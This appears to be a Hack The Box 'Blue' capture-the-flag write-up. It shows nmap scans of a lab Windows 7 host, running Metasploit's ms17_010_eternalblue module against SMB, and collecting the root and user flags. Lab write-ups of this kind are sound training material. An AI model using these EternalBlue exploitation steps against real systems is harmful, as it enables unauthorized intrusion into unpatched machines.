# Blue

## Ping Box 

ping 10.129.129.56

## Make a new directory

mkdir -p htb/Blue/nmap

## Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

    sudo nmap -sC -sV -O --reason -oA htb/Blue/nmap/initial 10.129.129.56

| **Flag** | **Description** |
| --------------|-------------------|
| `-sC` | Run default nmap scripts |
| `-sV` | Detect service version |
| `-O` | Detect OS |
| `--reason` | Determine the port and host state |
| `-oA` | Output all formats and store in file nmap/initial |

We get back the following results:

| **Port** | **Description** |
| --------------|-------------------|
| `135` | msrpc / Microsoft Windows RPC |
| `139` | netbios-ssn / Microsoft Windows netbios-ssn |
| `445` | microsoft-ds / Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) |

## Background Scan

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

    sudo nmap -sC -sV -O -p- --reason -oA htb/Blue/nmap/full 10.129.129.56

| **Flag** | **Description** |
| --------------|-------------------|
| `-sC` | Run default nmap scripts |
| `-sV` | Detect service version |
| `-O` | Detect OS |
| `-p-` |All Ports |
| `--reason` | Determine the port and host state |
| `-oA` | Output all formats and store in file nmap/initial |

We get back the following results:

| **Port** | **Description** |
| --------------|-------------------|
| `135` | msrpc / Microsoft Windows RPC |
| `139` | netbios-ssn / Microsoft Windows netbios-ssn |
| `445` | microsoft-ds / Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) |

## Blue

A well known and popular exploit, External Blue, uses the ports and services/versions we found during our namp scan. 

    └──╼ [★]$ sudo nmap -sC -sV -O -p- --reason -oA htb/Blue/nmap/full 10.129.129.56[sudo] password for htb-mbwest: 
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 03:22 BST
    Nmap scan report for 10.129.129.56
    Host is up, received echo-reply ttl 127 (0.080s latency).
    Not shown: 65526 closed tcp ports (reset)
    PORT      STATE SERVICE      REASON          VERSION
    135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

    Network Distance: 2 hops
    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   2.1: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2022-04-20T02:25:08
    |_  start_date: 2022-04-20T02:18:46
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb-os-discovery: 
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: haris-PC
    |   NetBIOS computer name: HARIS-PC\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2022-04-20T03:25:09+01:00
    |_clock-skew: mean: -19m55s, deviation: 34m36s, median: 2s


## Metasploit

`msfconsole`

Using the MSF search function, `search eternalblue`, we come across a few matches. 

![image](https://user-images.githubusercontent.com/87195021/164135103-f927db0d-16de-4353-9983-67ef38fc90b0.png)


We will use the `0` option, `exploit/windows/smb/ms17_010_eternalblue`. 

We will adjust the following options `lhost` and `rhosts` using the following commands; 
`set lhost tun0`
`set rhosts 10.129.129.56`

Run the exploit by typing, `exploit`

It took 3 attempts, but the exploit completed sucessfully. 

    [+] 10.129.129.56:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.129.129.56:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.129.129.56:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

![image](https://user-images.githubusercontent.com/87195021/164135898-0163de85-32d1-4d1a-a300-99a1c60fc922.png)

## Find Root Flag

A common place to check first is the Administrator's desktop....and we found the `root.txt`

![image](https://user-images.githubusercontent.com/87195021/164136102-4a922dab-f9c9-4b70-a4c2-c45ea2df9c41.png)

![image](https://user-images.githubusercontent.com/87195021/164136244-1253d1f0-14bb-47ce-9b41-ca6c4ce0619b.png)

## Find User Flag

Looking through the only other user, `haris`, we find the user.txt on his desktop. 

![image](https://user-images.githubusercontent.com/87195021/164140394-d5d0a1f9-7ca3-46b3-bc25-02b1a86da699.png)

## Box Pwned

![image](https://user-images.githubusercontent.com/87195021/164140648-31d50732-07c0-4f9b-8fe6-e26895f1d101.png)